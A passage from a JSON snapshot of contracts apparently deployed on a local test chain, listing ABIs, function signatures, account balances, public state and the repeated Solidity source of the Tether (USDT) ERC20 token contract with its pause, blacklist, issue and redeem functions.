_value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xe982E462b094850F12AF94d21D470e21bE9D0E9C",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857894140000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x59d3631c86BbE35EF041872d502F218A39FBa150",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x59d3631c86BbE35EF041872d502F218A39FBa150": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857894140000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        